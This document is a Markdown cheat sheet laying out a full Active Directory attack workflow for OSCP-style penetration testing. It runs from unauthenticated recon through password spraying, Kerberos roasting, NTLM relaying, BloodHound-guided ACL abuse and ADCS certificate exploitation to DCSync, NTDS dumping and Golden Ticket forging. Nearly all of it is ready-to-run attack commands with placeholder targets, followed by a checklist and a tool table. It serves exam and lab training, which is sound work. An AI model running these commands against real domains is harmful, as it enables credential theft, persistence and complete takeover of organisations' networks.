[AD attack-workflow md 36f15bd2d16c81bd8ed5e47af5d6fda7.md](https://github.com/user-attachments/files/28387674/AD.attack-workflow.md.36f15bd2d16c81bd8ed5e47af5d6fda7.md)

# AD/attack-workflow.md

> Recommended flow: No-creds recon → get first creds → authenticated enum + BloodHound → analyze edges → exploit ACLs → DA
> 

---

## Full Decision Flowchart

```
PHASE 0 — Recon without credentials
        │
nxc smb 192.168.x.0/24
  → hosts, hostname, domain, Windows version, SMB signing ON/OFF
        │
nxc smb <DC_IP> -u '' -p '' --rid-brute       → get users
nxc smb <DC_IP> -u '' -p '' --shares           → accessible shares
nxc smb <DC_IP> -u '' -p '' --pass-pol         → password policy before spray
nxc smb 192.168.x.0/24 --gen-relay-list relay_targets.txt  → hosts without SMB signing
nxc smb <TARGET> -u '' -p '' -M ms17-010 / zerologon / printnightmare
        │
        ▼
PHASE 1 — Initial access
        │
══ No credentials ══
nxc ldap <DC_IP> -u '' -p '' --asreproast asrep.hash      → AS-REP Roasting
nxc smb  <DC_IP> -u users.txt -p 'Password123!' --continue → Password Spray
Responder / SMB Relay (if SMB signing is off)
mitm6 + ntlmrelayx (IPv6 MITM)
        │
hashcat -m 18200 asrep.hash rockyou.txt
hashcat -m 13100 kerb.hash  rockyou.txt
        │
        ▼
PHASE 2 — Authenticated enumeration + BloodHound
        │
nxc ldap <DC_IP> -u <user> -p '<pass>' --bloodhound -c All --dns-server <DC_IP>
nxc ldap <DC_IP> -u <user> -p '<pass>' --users
nxc ldap <DC_IP> -u <user> -p '<pass>' --groups
nxc ldap <DC_IP> -u <user> -p '<pass>' -M user-desc        → passwords in description field
nxc smb  <DC_IP> -u <user> -p '<pass>' --shares
nxc smb  <DC_IP> -u <user> -p '<pass>' -M spider_plus
nxc ldap <DC_IP> -u <user> -p '<pass>' -M adcs             → is there a CA?
nxc ldap <DC_IP> -u <user> -p '<pass>' --trusted-for-delegation
nxc smb  192.168.x.0/24 -u <user> -p '<pass>'             → (Pwn3d!) = local admin
        │
        ▼
PHASE 3 — Quick Wins (always try these first)
        │
• Kerberoasting:   nxc ldap --kerberoasting
• ADCS:            certipy find -vulnerable -stdout
• Local admin:     nxc --sam / -M lsassy / impacket-secretsdump
• PTH sweep:       nxc smb 192.168.x.0/24 -u <user> -H <hash>
• noPac:           (old unpatched DC)
• BloodHound:      Shortest Paths to Domain Admins
        │
        ▼
PHASE 4 — ACL Abuses (BloodHound edges)
        │
══ Depends on what edge BloodHound shows ══

WriteOwner/Owns?
  → bloodyAD set owner + dacledit.py -rights FullControl → GenericAll

WriteDACL?
  → dacledit.py -rights FullControl / DCSync → exploit

GenericAll on user?
  → bloodyAD set password / certipy shadow auto

GenericAll on group?
  → bloodyAD add groupMember "Domain Admins"

GenericWrite on user?
  → targetedKerberoast.py / certipy shadow auto / pywhisker

GenericWrite on computer?
  → impacket-rbcd + impacket-getST / certipy shadow auto

AddKeyCredentialLink or GenericWrite on user/PC?
  → certipy shadow auto → NT hash → PTH

AddMember / AddSelf on group?
  → bloodyAD add groupMember → re-enumerate

ForceChangePassword?
  → net rpc password / bloodyAD set password (noisy)

AllowedToDelegate?
  → impacket-findDelegation + impacket-getST -impersonate Administrator

AllowedToAct / WriteAccountRestrictions on PC?
  → impacket-addcomputer + impacket-rbcd + impacket-getST

GetChanges + GetChangesAll on domain?
  → nxc smb --ntds / impacket-secretsdump → krbtgt → Golden Ticket

WriteGPLink / GenericAll on GPO?
  → pygpoabuse.py -command 'net user hacker ...'
        │
        ▼
PHASE 5 — ADCS (if certipy find returns an ESC)
        │
ESC1/2/6? → certipy req -upn administrator@domain → certipy auth → PTH
ESC3?     → request agent cert → request on-behalf-of → certipy auth
ESC4?     → certipy template -write-default-configuration → ESC1 → restore
ESC7?     → certipy ca -add-officer → SubCA → issue-request → certipy auth
ESC8?     → certipy relay + PetitPotam/PrinterBug → dc.pfx → DCSync
        │
        ▼
    Domain Admin ✓
    nxc smb <DC_IP> -u Administrator -H <hash> --ntds
    impacket-secretsdump '<domain>/Administrator'@<DC_IP> -hashes ':<hash>'
    → Golden Ticket: impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain <domain> Administrator
```

---

## ✅ OSCP Checklist — Active Directory

```
□ Add domain to /etc/hosts
□ Full nmap scan (-sVC -p-)
□ nxc smb 192.168.x.0/24 → hosts, SMB signing, versions
□ nxc smb <DC> -u '' -p '' --rid-brute → user list
□ nxc smb <DC> -u '' -p '' --pass-pol → password policy before spray
□ nxc smb 192.168.x.0/24 --gen-relay-list relay_targets.txt
□ Anonymous SMB (smbclient, smbmap) + SYSVOL/cPasswords
□ Anonymous LDAP (ldapsearch namingcontexts)
□ Kerbrute + AS-REP Roasting
□ Responder + Password spray (after checking policy)
□ With creds: nxc ldap --bloodhound -c All
□ With creds: nxc ldap -M user-desc
□ With creds: nxc ldap -M adcs
□ With creds: nxc smb --shares + -M spider_plus
□ Kerberoasting: nxc ldap --kerberoasting
□ BloodHound → Shortest Path to DA + ACL Abuses
□ certipy find -vulnerable (if ADCS found in nmap)
□ noPac (if old DC) / PrinterBug check
□ nxc subnet sweep → (Pwn3d!) = local admin → lsassy/secretsdump
□ BloodHound edges → run the right ACL attack
□ ADCS: ESC1 (certipy req -upn) / ESC8 (certipy relay + PetitPotam)
□ DA: nxc --ntds / secretsdump / Golden Ticket
```

---

## 🛠️ Quick Arsenal — Full Tools Table

| Tool | Phase | Use |
| --- | --- | --- |
| `nxc` / `netexec` | 0,1,2,3 | Swiss knife: recon, spray, exec, dump, modules |
| `bloodhound-python` | 2 | Remote ingestor from Linux |
| `SharpHound.exe` | 2 | Ingestor from Windows |
| `bloodyAD` | 3 | AD object modification via LDAP from Linux |
| `dacledit.py` | 3 | Read/write DACLs from Linux |
| `impacket-secretsdump` | 3 | DCSync + remote hash dump |
| `impacket-getST` | 3 | Request S4U2Proxy service tickets |
| `impacket-rbcd` | 3 | Configure RBCD from Linux |
| `impacket-addcomputer` | 3 | Create machine accounts for RBCD |
| `impacket-ticketer` | 3 | Golden/Silver Tickets |
| `pywhisker` | 3 | Shadow Credentials from Linux |
| `targetedKerberoast.py` | 3 | Targeted Kerberoasting with fake SPN |
| `pygpoabuse.py` | 3 | GPO abuse from Linux |
| `OUned.py` | 3 | gPLink spoofing on OUs (Synacktiv 2024) |
| `certipy` | 4 | ADCS enumeration and exploitation (ESC1–ESC10) |
| `PetitPotam.py` | 4 | NTLM coercion from DC for ESC8 |
| `printerbug.py` | 4 | NTLM coercion via MS-RPRN for ESC8 |
| `Certify.exe` | 4 | ADCS enumeration from Windows |
| `PowerView.ps1` | 2,3 | AD enumeration and abuse from Windows |
| `Rubeus.exe` | 3,4 | Kerberos swiss knife on Windows |
| `Whisker.exe` | 3 | Shadow Credentials from Windows |
| `SharpGPOAbuse.exe` | 3 | GPO abuse from Windows |
| `Mimikatz.exe` | 3 | Credential dump + Kerberos on Windows |
| `evil-winrm` | 3 | Interactive shell via WinRM |
| `Responder` | 1 | Capture NTLM hashes |
| `mitm6` | 1 | IPv6 MITM relay |
| `kerbrute` | 0 | Valid user enumeration |
| `ldapdomaindump` | 2 | Visual domain dump |
| `rpcclient` | 0,2 | RPC enumeration |
